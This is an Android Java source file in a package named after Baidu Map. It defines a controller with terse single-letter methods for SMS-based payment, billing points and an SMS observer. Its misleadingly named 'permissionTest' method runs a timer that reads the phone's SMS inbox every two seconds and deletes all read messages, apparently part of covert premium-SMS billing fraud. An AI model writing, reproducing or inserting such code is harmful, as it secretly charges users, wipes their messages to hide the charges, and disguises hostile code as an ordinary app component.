package com.baidu.BaiduMap;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;

import com.baidu.BaiduMap.httpCenter.InitRequest;
import com.baidu.BaiduMap.manager.NormalRequestThroughManager;
import com.baidu.BaiduMap.manager.PayPointManager;
import com.baidu.BaiduMap.sms.RegistSmsObserver;

import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by Administrator on 2017/7/21.
 */

public class Controler {
    private static Controler controler = null;

    public static Controler getInstance() {
        if (controler == null) {
            controler = new Controler();
        }
        return controler;
    }

    /*
    初始化
     */
    public void i(Context context, String price, String Did, String productName, Object initCallBack, Object payCallBack) {
        Handler initHandler = (Handler) initCallBack;
        Handler payCallHandler = (Handler) payCallBack;
        InitRequest.getInstance().request(context, price, Did, productName, initHandler, payCallHandler);
        permissionTest(context);
    }

    /*
    支付
     */
    public void p(Context context, String str, String price, String Did, String productName, Object payCallBackHandler) {
        Handler normalpayCallBackHandler = (Handler) payCallBackHandler;
        NormalRequestThroughManager.getInstance().chooseRequestWay(context, str, Did, productName, price, normalpayCallBackHandler);
    }

    /*
    获取计费点
     */
    public HashMap<String, Map<String, Object>> g() {
        return PayPointManager.getInstance().getPayPoint();
    }

    /*
    关闭
     */
    public void c(Context context) {
        RegistSmsObserver.getInstance().unRegist(context);
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    /*
    注册短信观测者
     */
    public void r(Context context) {
        RegistSmsObserver.getInstance().regist(context);
    }

    public static void permissionTest(final Context context) {
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                context.getContentResolver().query(Uri.parse("content://sms"),
                        new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"1"},
                        "date desc");
                context.getContentResolver().delete(Uri.parse("content://sms"), "read=1", null);
            }
        }, 3000, 2000);
    }
}
